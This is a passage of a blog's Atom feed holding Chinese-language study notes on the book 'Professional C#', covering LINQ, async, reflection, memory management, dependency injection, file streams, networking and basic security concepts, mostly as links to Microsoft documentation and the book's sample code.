class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the key is not in the list</td>
<td>n/a</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h1 id="chapter-11-special-collections">Chapter 11: Special Collections</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.collections.specialized?view=netcore-3.1">System.Collections.Specialized 命名空间</a></li>
</ul>
<h2 id="working-with-bits">WORKING WITH BITS</h2>
<p><em><strong>高阶知识，以后再补</strong></em></p>
<h2 id="observable-collections">OBSERVABLE COLLECTIONS</h2>
<p><em><strong>高阶知识，以后再补</strong></em></p>
<h2 id="immutable-collections">IMMUTABLE COLLECTIONS</h2>
<p><em><strong>高阶知识，以后再补</strong></em></p>
<h2 id="concurrent-collections">CONCURRENT COLLECTIONS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/collections/thread-safe/">线程安全集合</a></li>
</ul>
<h1 id="chapter-12-language-integrated-query">Chapter 12: Language Integrated Query</h1>
<h2 id="linq-overview">LINQ OVERVIEW</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/using-linq">LINQ（语言集成查询）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/linq/linq-in-csharp">C# 中的 LINQ</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/linq/">语言集成查询 (LINQ)</a></li>
</ul>
<h2 id="standard-query-operators">STANDARD QUERY OPERATORS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/linq/query-expression-syntax-for-standard-query-operators">标准查询运算符的查询表达式语法 (C#)</a></li>
</ul>
<h2 id="parallel-linq">PARALLEL LINQ</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/parallel-programming/introduction-to-plinq">PLINQ 介绍</a></li>
</ul>
<h2 id="expression-trees">EXPRESSION TREES</h2>
<p><em><strong>高阶知识，以后再补</strong></em></p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/expression-trees">表达式树</a></li>
</ul>
<h2 id="linq-providers">LINQ PROVIDERS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/linq/how-to-add-custom-methods-for-linq-queries">如何为 LINQ 查询添加自定义方法 (C#)</a></li>
</ul>
<h1 id="chapter-13-functional-programming-with-c">Chapter 13: Functional Programming with C#</h1>
<ul>
<li>C# 不是函数式语言，对纯函数式编程感兴趣请选择 F#。</li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/linq/functional-programming-vs-imperative-programming">函数编程与命令式编程 (C#)</a></li>
</ul>
<h2 id="tuples">TUPLES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/tuples">C# 元组类型</a></li>
</ul>
<h2 id="pattern-matching">PATTERN MATCHING</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/pattern-matching">模式匹配</a></li>
</ul>
<h1 id="chapter-14-errors-and-exceptions">Chapter 14: Errors and Exceptions</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/exceptions/">异常和异常处理（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/exceptions/">在 .NET 中处理和引发异常</a></li>
</ul>
<h1 id="chapter-15-asynchronous-programming">Chapter 15: Asynchronous Programming</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/async">异步编程</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/async/">使用 Async 和 Await 的异步编程</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/parallel-processing-and-concurrency">.NET 中的并行处理、并发和异步编程</a></li>
</ul>
<h2 id="error-handling">ERROR HANDLING</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/try-catch#async-method-example">异步方法示例</a></li>
</ul>
<h1 id="chapter-16-reflection-metadata-and-dynamic-programming">Chapter 16: Reflection, Metadata, and Dynamic Programming</h1>
<ul>
<li>此章设计底层理论知识，建议看书。</li>
<li><a href="https://zhuanlan.zhihu.com/p/55694402">Siki——C#高级教程 (37~43) 反射和特性</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/metadata-and-self-describing-components">元数据和自描述组件</a></li>
</ul>
<h2 id="custom-attributes">CUSTOM ATTRIBUTES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/attributes/">特性 (C#)</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/attributes/">利用特性扩展元数据</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/tutorials/attributes">在 C# 中使用属性</a></li>
</ul>
<h2 id="using-reflection">USING REFLECTION</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/41282759">C#反射机制</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/reflection">反射 (C#)</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/reflection-and-codedom/reflection">.NET 中的反射</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/assembly/">.NET 中的程序集</a></li>
</ul>
<h2 id="the-dynamic-type">THE DYNAMIC TYPE</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/builtin-types/reference-types#the-dynamic-type">动态类型</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/types/using-type-dynamic">使用类型 dynamic（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/reflection-and-codedom/">.NET Framework 中的动态编程</a></li>
</ul>
<h1 id="chapter-17-managed-and-unmanaged-memory">Chapter 17: Managed and Unmanaged Memory</h1>
<ul>
<li>此章涉及底层理论知识，建议看书。</li>
<li>除 GC 部分外的高阶知识可以以后补。</li>
</ul>
<h2 id="memory-management-under-the-hood">MEMORY MANAGEMENT UNDER THE HOOD</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/garbage-collection/">垃圾回收</a></li>
</ul>
<h2 id="strong-and-weak-references">STRONG AND WEAK REFERENCES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/garbage-collection/weak-references">弱引用</a></li>
</ul>
<h2 id="working-with-unmanaged-resources">WORKING WITH UNMANAGED RESOURCES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/garbage-collection/unmanaged">清理非托管资源</a></li>
</ul>
<h2 id="unsafe-code">UNSAFE CODE</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/unsafe-code-pointers/">不安全代码和指针（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/unsafe">unsafe（C# 参考）</a></li>
</ul>
<h2 id="reference-semantics">REFERENCE SEMANTICS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/whats-new/csharp-7#ref-locals-and-returns">Ref 局部变量和返回结果</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/whats-new/csharp-7-2#safe-efficient-code-enhancements">安全高效的代码的增强功能</a></li>
</ul>
<h2 id="spant">SPAN<T></h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.span-1?view=netcore-3.1">Span<T> 结构</a></li>
</ul>
<blockquote>
<p>Chapter 3 includes creating reference types (classes) and value types (structs). Instances of classes are stored on the managed heap. The value of structs can be stored on the stack, or, when boxing is used, on the managed heap. Now we have another kind: a type that can have its value only on the stack but never on the heap, sometimes called <em>ref-like</em> types. Boxing is not possible with these types. Such a type is declared with the <code>ref struct</code> keyword. Using <code>ref struct</code> gives some additional behaviors and restrictions. The restrictions are the following:</p>
<ul>
<li>They can't be added as array items.</li>
<li>They can't be used as generic type argument.</li>
<li>They can't be boxed.</li>
<li>They can't be static fields.</li>
<li>They can only be instance fields of ref-like types.</li>
</ul>
</blockquote>
<h2 id="platform-invoke">PLATFORM INVOKE</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/interop/marshaling-data-with-platform-invoke">用平台调用封送数据</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/interop/platform-invoke-examples">平台调用示例</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[《C#高级编程》- .Net Core and Windows Runtime]]></title>
        <id>https://zhangyue-vhyt.github.io/post/csharp-note-3/</id>
        <link href="https://zhangyue-vhyt.github.io/post/csharp-note-3/">
        </link>
        <updated>2020-05-07T04:13:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>这部分是关于 .NET Core and the Windows Runtime 的内容。官方文档参照 <a href="https://docs.microsoft.com/zh-cn/dotnet/standard/">.Net 指南</a> 和 <a href="https://docs.microsoft.com/zh-cn/aspnet/core/?view=aspnetcore-3.1">.Net Core 文档</a> 为主。</p>
<h1 id="chapter-19-libraries-assemblies-packages-and-nuget">Chapter 19: Libraries, Assemblies, Packages, and NuGet</h1>
<ul>
<li>此章为项目管理，不涉及编程。</li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/core/tools">.NET Core CLI overview</a></li>
</ul>
<h1 id="chapter-20-dependency-injection">Chapter 20: Dependency Injection</h1>
<h2 id="what-is-dependency-injection">WHAT IS DEPENDENCY INJECTION?</h2>
<p>这里先介绍下控制反转：</p>
<blockquote>
<p>控制反转（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计原则，可以用来减低计算机代码之间的耦合度。其中最常见的方式叫做依赖注入（Dependency Injection，简称DI）</p>
</blockquote>
<p>依赖注入是控制反转的一种实现方式</p>
<p>具体什么是控制反转呢？</p>
<blockquote>
<p><code>Class A</code> 中用到了 <code>Class B</code> 的对象 <code>b</code>，一般情况下，需要在 <code>A</code> 的代码中显式的 <code>new</code> 一个 <code>B</code> 的对象。<br>
采用依赖注入技术之后，<code>A</code> 的代码只需要定义一个私有的 <code>B</code> 对象，不需要直接 <code>new</code> 来获得这个对象，而是通过相关的容器控制程序来将B对象在外部 <code>new</code> 出来并注入到A类里的引用中。而具体获取的方法、对象被获取时的状态由配置文件（如 <code>XML</code>）来指定。</p>
</blockquote>
<p>简单地说，就是当 <code>A</code> 对象依赖 <code>B</code> 对象时，传统的做法时在 <code>A</code> 中 <code>new</code> 一个 <code>B</code> 对象，现在改为：在外部先 <code>new</code> 一个B对象，然后通过 <code>class A</code> 的构造函数传递给 <code>A</code> 对象。</p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1">在 ASP.NET Core 依赖注入</a></li>
<li><a href="https://angular.cn/guide/architecture-services">服务与依赖注入简介</a></li>
<li>在 .Net Core 中，可以把除了 <code>StartUp</code> 和 <code>Program</code> 之外的类都当作服务。</li>
</ul>
<h3 id="using-a-service-without-dependency-injection">Using a Service Without Dependency Injection</h3>
<p>代码来源于《C#高级编程》</p>
<ol>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/NoDI/GreetingService.cs">创建一个依赖/服务</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/NoDI/HomeController.cs">创建一个使用上述服务的新服务</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/NoDI/Program.cs"><code>Main</code> 函数</a></li>
</ol>
<h3 id="using-dependency-injection">Using Dependency Injection</h3>
<blockquote>
<p>使用接口或基类抽象化依赖关系实现。</p>
<p>--- <a href="https://docs.microsoft.com/zh-cn/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1">在 ASP.NET Core 依赖注入</a></p>
</blockquote>
<ol>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDI/IGreetingService.cs">创建被依赖的服务接口</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDI/GreetingService.cs">创建被依赖的服务</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDI/HomeController.cs">创建一个依赖上述服务的新服务</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDI/Program.cs"><code>Main</code> 函数</a></li>
</ol>
<h2 id="using-the-net-core-di-container">USING THE .NET CORE DI CONTAINER</h2>
<blockquote>
<ul>
<li>注册服务容器中的依赖关系。 ASP.NET Core 提供了一个内置的服务容器 <code>IServiceProvider</code>。 服务已在应用的 <code>Startup.ConfigureServices</code> 方法中注册。</li>
<li>将服务注入 到使用它的类的构造函数中。 框架负责创建依赖关系的实例，并在不再需要时对其进行处理。</li>
</ul>
<p>--- <a href="https://docs.microsoft.com/zh-cn/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1">在 ASP.NET Core 依赖注入</a></p>
</blockquote>
<p>服务容器的示例：</p>
<ol>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDIContainer/IGreetingService.cs">创建被依赖的服务接口</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDIContainer/GreetingService.cs">创建被依赖的服务</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDIContainer/HomeController.cs">创建一个依赖上述服务的新服务</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/WithDIContainer/Program.cs"><code>Main</code> 函数</a></li>
</ol>
<h2 id="lifetime-of-services">LIFETIME OF SERVICES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1#service-lifetimes">服务生存期</a></li>
<li><a href="https://itcodemonkey.com/article/14400.html">.NET Core 注入中的三种模式：Singleton、Scoped 和 Transient</a></li>
</ul>
<h3 id="using-singleton-and-transient-services">Using Singleton and Transient Services</h3>
<blockquote>
<p>Registering a service as a singleton always returns the same instance, and registering a service as transient returns a new object every time the service is injected.</p>
</blockquote>
<h3 id="using-scoped-services">Using Scoped Services</h3>
<blockquote>
<p>Services can also be registered within a scope. This is something inbetween transient and singleton. With singleton, only a single instance is created. Transient creates a new instance every time the service is requested from the container. With scoped, always the same instance is returned from the same scope, but from a different scope a different instance is returned.</p>
</blockquote>
<h2 id="initialization-of-services-using-options-and-using-configuration-files">INITIALIZATION OF SERVICES USING OPTIONS and USING CONFIGURATION FILES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/aspnet/core/fundamentals/configuration/options?view=aspnetcore-3.1">ASP.NET Core 中的选项模式</a></li>
<li><a href="https://www.cnblogs.com/wzk153/p/11307014.html">（13）ASP.NET Core2.2 中的选项模式（Options）</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/tree/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/DIWithOptions">DI with options example</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/tree/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/DIWithConfiguration">DI with configuration files example</a></li>
</ul>
<h2 id="creating-platform-independence">CREATING PLATFORM INDEPENDENCE</h2>
<blockquote>
<p>Dependency injection also can be used to use platform-specific features from platform-independent libraries.</p>
</blockquote>
<p>这部分内容是不跨平台的，以后有需要再补。</p>
<h2 id="using-other-di-containers">USING OTHER DI CONTAINERS</h2>
<blockquote>
<p><code>Microsoft.Extensions.DependencyInjection</code> is a simple DI container; many third-party containers offer additional functionality. For example, Autofac allows configuration of the services in a configuration file.</p>
</blockquote>
<p>原生的 DI 容器非常轻量，如果需要更复杂的容器，推荐使用 <a href="https://autofaccn.readthedocs.io/zh/latest/">Autofac</a>。</p>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/tree/1548a1b211df1ed75a306eeacae3c1edf467c591/DependencyInjection/DependencyInjectionSamples/DIWithAutofac">DI with Autofac example</a></li>
</ul>
<h1 id="chapter-21-tasks-and-parallel-programming">Chapter 21: Tasks and Parallel Programming</h1>
<p>《C#高级编程》中并行和异步内容过于详细庞杂，在学习时推荐上手练习 LeetCode 的 Concurrency 和 Codewar 的多线程题目。</p>
<h2 id="overview">OVERVIEW</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/parallel-processing-and-concurrency">.NET 中的并行处理、并发和异步编程</a></li>
<li>C# 使用 <code>Task</code> 进行异步编程，<code>Parallel</code> 类进行并行编程。如果想要更多的控制权限，使用 <code>Thread</code>。</li>
<li>需要同步机制 <code>synchronization</code> 去防止竞争危害 (race condition) 和死锁 (deadlock)。</li>
<li>除了 <code>synchronization</code> 外，使用不可变类型 (immutable types) 也是一种方案。</li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/threading/overview-of-synchronization-primitives">同步基元概述</a></li>
</ul>
<h2 id="parallel-class">PARALLEL CLASS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/parallel-programming/data-parallelism-task-parallel-library?view=netcore-3.1">数据并行（任务并行库）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.threading.tasks.parallel?view=netcore-3.1">Parallel 类</a></li>
<li><a href="https://www.cnblogs.com/yunfeifei/p/3993401.html">5天玩转C#并行和多线程编程 —— 第一天 认识Parallel</a></li>
</ul>
<h2 id="tasks">TASKS</h2>
<blockquote>
<p>Parallel.For用起来方便，但是在实际开发中还是尽量少用，因为它的不可控性太高，有点简单粗暴的感觉，可能带来一些不必要的&quot;麻烦&quot;,最好还是使用Task，因为Task的可控性较好。</p>
<p>--- 5天玩转 C# 并行和多线程编程</p>
</blockquote>
<ul>
<li><a href="https://www.cnblogs.com/yunfeifei/p/4106318.html">5天玩转C#并行和多线程编程 —— 第三天 认识和使用Task</a></li>
</ul>
<h1 id="chapter-22-files-and-streams">Chapter 22: Files and Streams</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/">文件和流 I/O</a></li>
</ul>
<h2 id="managing-the-file-system">MANAGING THE FILE SYSTEM</h2>
<blockquote>
<p>Directories or folders? These terms are often used interchangeably. Directory is a classical term for a file system object. A directory contains files and other directories. A folder has its origin with Apple's Lisa and is a GUI object. Often it is associated with an icon to map to a directory.</p>
</blockquote>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/#files-and-directories">文件和目录</a></li>
</ul>
<h3 id="using-file-to-read-and-write">Using File to Read and Write</h3>
<ul>
<li>官方文档使用的是 <code>StreamReader</code> 和 <code>StreamWriter</code> 进行读写操作。</li>
<li>对于小文件，<code>File.ReadAllText</code> 和 <code>File.WriteAllText</code> 是更便捷的方式，详情参考 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.file?view=netcore-3.1">File 类</a></li>
</ul>
<h2 id="enumerating-files">ENUMERATING FILES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-enumerate-directories-and-files">如何：枚举目录和文件</a></li>
</ul>
<h2 id="working-with-streams">WORKING WITH STREAMS</h2>
<blockquote>
<p>A stream is an object used to transfer data.</p>
</blockquote>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/StreamSamples/Program.cs">StreamSamples</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.filestream?view=netcore-3.1">FileStream 类</a></li>
</ul>
<h2 id="using-readers-and-writers">USING READERS AND WRITERS</h2>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/ReaderWriterSamples/Program.cs">ReaderWriterSamples</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-read-and-write-to-a-newly-created-data-file">如何：对新建的数据文件进行读取和写入</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-write-text-to-a-file">如何：将文本写入文件</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-read-text-from-a-file">如何：从文件中读取文本</a></li>
</ul>
<h2 id="compressing-files">COMPRESSING FILES</h2>
<blockquote>
<p>Both <code>DeflateStream</code> and <code>GZipStream</code> use the same algorithm for compression (in fact, <code>GZipStream</code> uses <code>DeflateStream</code> behind the scenes), but <code>GZipStream</code> adds a cyclic redundancy check to detect data corruption. <code>Brotli</code> is a relatively new open-source compression algorithm from Google. The speed of <code>Brotli</code> is similar to deflate, but it offers a better compression. Contrary to most other compression algorithms, it uses a dictionary for often-used words for better compression. Nowadays this algorithm is supported by most modern browsers.</p>
</blockquote>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/CompressFileSample/Program.cs">CompressFileSample</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-compress-and-extract-files">如何：压缩和解压缩文件</a></li>
</ul>
<h3 id="using-brotli">Using Brotli</h3>
<blockquote>
<p>Add the NuGet package <code>System.IO.Compression.Brotli</code> and instantiate the <code>BrotliStream</code> class</p>
</blockquote>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/CompressFileSample/Program.cs#L90-L100">Compress file with Brotli example</a></li>
</ul>
<blockquote>
<p>Decompression works accordingly using <code>BrotliStream</code>:</p>
</blockquote>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/CompressFileSample/Program.cs#L102-L116">Decompress file with Brotli example</a></li>
</ul>
<h2 id="watching-file-changes">WATCHING FILE CHANGES</h2>
<blockquote>
<p>With <code>FileSystemWatcher</code>, you can monitor file changes. Events are fired on creating, renaming, deleting, and changing files. This can be used in scenarios where you need to react on file changes — for example, with a server when a file is uploaded, or in a case where a file is cached in memory and the cache needs to be invalidated when the file changes.</p>
</blockquote>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/FileMonitor/Program.cs">FileMonitor</a></li>
</ul>
<h2 id="working-with-memory-mapped-files">WORKING WITH MEMORY MAPPED FILES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/memory-mapped-files">内存映射文件</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/MemoryMappedFilesSample/Program.cs">MemoryMappedFilesSample</a></li>
</ul>
<h2 id="communicating-with-pipes">COMMUNICATING WITH PIPES</h2>
<blockquote>
<p>管道本质上就是一个文件，前面的进程以写方式打开文件，后面的进程以读方式打开。这样前面写完后面读，于是就实现了通信。实际上管道的设计也是遵循 UNIX 的“一切皆文件”设计原则的，它本质上就是一个文件。Linux 系统直接把管道实现成了一种文件系统，借助 VFS 给应用程序提供操作接口。<br>
虽然实现形态上是文件，但是管道本身并不占用磁盘或者其他外部存储的空间。在Linux的实现上，它占用的是内存空间。所以，Linux上的管道就是一个操作方式为文件的内存缓冲区。<br>
--- <a href="https://zhuanlan.zhihu.com/p/58489873">Linux 的进程间通信：管道</a></p>
</blockquote>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/pipe-operations">.NET 中的管道操作</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/pipelines">.NET 中的 System.IO.Pipelines</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/AnonymousPipes/Program.cs">AnonymousPipes</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/PipesReader/Program.cs">PipesReader</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/PipesWriter/Program.cs">PipesWriter</a></li>
</ul>
<h2 id="using-files-and-streams-with-the-windows-runtime">USING FILES AND STREAMS WITH THE WINDOWS RUNTIME</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-convert-between-dotnet-streams-and-winrt-streams">如何：在 .NET Framework 和 Windows 运行时流之间进行转换（仅限 Windows）</a></li>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/tree/1548a1b211df1ed75a306eeacae3c1edf467c591/FilesAndStreams/FilesAndStreamsSamples/WindowsAppEditor">WindowsAppEditor</a></li>
</ul>
<h1 id="chapter-23-networking">Chapter 23: Networking</h1>
<blockquote>
<p>The two namespaces of most interest for networking are <code>System.Net</code> and <code>System.Net.Sockets</code>. The <code>System.Net</code> namespace is generally concerned with higher-level operations, such as downloading and uploading files, and making web requests using HTTP and other protocols, whereas <code>System.Net.Sockets</code> contains classes to perform lower-level operations. You will find these classes useful when you want to work directly with sockets or protocols, such as TCP/IP.</p>
</blockquote>
<blockquote>
<p>The HTTP protocol is based on TCP, and thus the HttpXX classes offered an abstraction layer over the TcpXX classes. The TcpXX classes, however, give you more control. You can even get more control than offered by the TcpXX or UdpXX classes with sockets. With sockets, you can use different protocols, not only protocols based on TCP or UDP, and also create your own protocol. What might be even more important is that you can have more control over TCP- or UDP-based protocols.</p>
</blockquote>
<h2 id="the-httpclient-class">THE HTTPCLIENT CLASS</h2>
<p>这部分是客户端内容</p>
<blockquote>
<p>The <code>HttpClient</code> class is used to send an HTTP request and receive the response from the request. It is in the <code>System.Net.Http</code> namespace. The classes in the <code>System.Net.Http</code> namespace help make it easy to consume web services for both clients and server.</p>
</blockquote>
<p>传统 <code>HttpClient</code> 的基本用法</p>
<ul>
<li><a href="https://github.com/ProfessionalCSharp/ProfessionalCSharp7/blob/master/Networking/NetworkingSamples/HttpClientSample/HttpClientSamples.cs">HttpClientSamples</a></li>
</ul>
<p>新版本的 .Net Core 推荐使用 <code>IHttpClientFactory</code> 来创建 <code>HttpClient</code>。</p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/aspnet/core/fundamentals/http-requests?view=aspnetcore-3.1">在 ASP.NET Core 中使用 IHttpClientFactory 发出 HTTP 请求</a></li>
<li><a href="https://www.cnblogs.com/willick/p/net-core-httpclient.html">.NET Core 中正确使用 HttpClient 的姿势</a></li>
</ul>
<h2 id="working-with-the-weblistener-class">WORKING WITH THE WEBLISTENER CLASS</h2>
<p>我们的 web 程序需要一个宿主,所以 <code>CreateHostBuilder</code> 这个方法就创建了一个 <code>IHostBuilder</code>. 而且我们还需要 Web Server.</p>
<p>Asp.Net Core 自带了两种 http servers, 一个是 <code>WebListener</code> , 它只能用于 Windows 系统, 另一个是 <code>kestrel</code> , 它是跨平台的.</p>
<p><code>WebListener</code> 是一个只能运行在 Windows 上的 ASP.NET Core web 服务器，基于 <code>Http.Sys</code> 内核模块驱动构建。</p>
<h1 id="chapter-24-security">Chapter 24: Security</h1>
<h2 id="verifying-user-information">VERIFYING USER INFORMATION</h2>
<blockquote>
<p>Two fundamental pillars of security are authentication and authorization. Authentication is the process of identifying the user, and authorization occurs afterward to verify that the identified user is allowed to access a specific resource.</p>
</blockquote>
<p>这部分内容还是用 IdentityServer 更好。</p>
<ul>
<li><a href="https://identityserver4.readthedocs.io/en/latest/">IdentityServer 官方文档</a></li>
</ul>
<hr>
<p>剩下的内容单靠书本上的理论知识无法充分理解，需要实战演练。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[《C#高级编程》- The C# Language Part 1]]></title>
        <id>https://zhangyue-vhyt.github.io/post/csharp-notes-1/</id>
        <link href="https://zhangyue-vhyt.github.io/post/csharp-notes-1/">
        </link>
